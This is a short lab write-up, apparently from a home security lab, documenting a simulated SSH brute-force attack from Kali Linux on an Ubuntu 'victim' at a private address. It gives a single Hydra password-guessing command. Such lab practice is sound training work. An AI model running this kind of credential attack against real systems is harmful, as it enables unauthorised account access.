\# Hydra SSH Brute Force Simulation



\## Objective



Simulate SSH brute-force attempts from Kali Linux to Ubuntu Victim.



\## Command Used



```bash

hydra -l <username> -P passwords.txt -t 2 -V 192.168.100.20 ssh

